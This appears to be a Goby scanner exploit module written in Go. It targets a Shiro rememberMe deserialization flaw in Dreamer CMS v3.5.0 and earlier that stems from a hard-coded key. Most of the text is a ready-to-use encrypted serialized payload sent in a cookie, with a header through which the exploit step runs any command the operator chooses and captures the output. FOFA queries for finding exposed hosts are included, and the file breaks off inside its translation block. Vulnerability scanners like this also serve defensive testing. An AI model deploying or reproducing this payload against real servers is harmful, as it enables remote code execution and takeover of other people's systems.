package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "dreamer cms shiro rememberme rce",
    "Description": "<p>Dreamer CMS is an open source, free and simplified CMS system.</p><p>Dreamer CMS  v3.5.0 and earlier versions have a security vulnerability, which stems from the existence of hard coded shiro-key in the software, which can be used by attackers to execute arbitrary code.</p>",
    "Product": "Dreamer CMS",
    "Homepage": "https://gitee.com/isoftforce/dreamer_cms",
    "DisclosureDate": "2022-06-19",
    "Author": "蜡笔小新",
    "FofaQuery": "header=\"dreamer\" || title=\"dreamer blog\" || body=\"Dreamer CMS\" || banner=\"dreamer-cms-s=\" || header=\"dreamer-cms-s=\"",
    "GobyQuery": "header=\"dreamer\" || title=\"dreamer blog\" || body=\"Dreamer CMS\" || banner=\"dreamer-cms-s=\" || header=\"dreamer-cms-s=\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://gitee.com/isoftforce/dreamer_cms\">https://gitee.com/isoftforce/dreamer_cms</a></p><p><a href=\"https://gitee.com/mingSoft/MCMS\"></a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "command",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {
                    "Cookie": "dreamer-cms-r=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",
                    "testcmd": "echo 170b77ad8c3d9b365fef9e58974f1b87",
                    "testecho": "170b77ad8c3d9b365fef9e58974f1b87"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "170b77ad8c3d9b365fef9e58974f1b87",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "170b77ad8c3d9b365fef9e58974f1b87",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {
                    "Cookie": "dreamer-cms-r=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",
                    "testecho": "170b77ad8c3d9b365fef9e58974f1b87",
                    "testcmd": "{{{command}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "170b77ad8c3d9b365fef9e58974f1b87",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "dreamer cms shiro rememberme 反序列化漏洞",
            "Product": "Dreamer CMS",
            "Description": "<p>Dreamer CMS <span style=\"color: rgb(64, 72, 91); font-size: 16px;\">是一个开源、免费、精简的CMS系统。</span></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Dreamer CMS&nbsp;</span>v3.5.0 及之前的版本存在安全漏洞，该漏洞源于软件存在硬编码的 shiro-key，攻击者可利用该key并执行任意代码。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://gitee.com/isoftforce/dreamer_cms\">https://gitee.com/isoftforce/dreamer_cms</a><a href=\"https://gitee.com/mingSoft/MCMS\"></a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
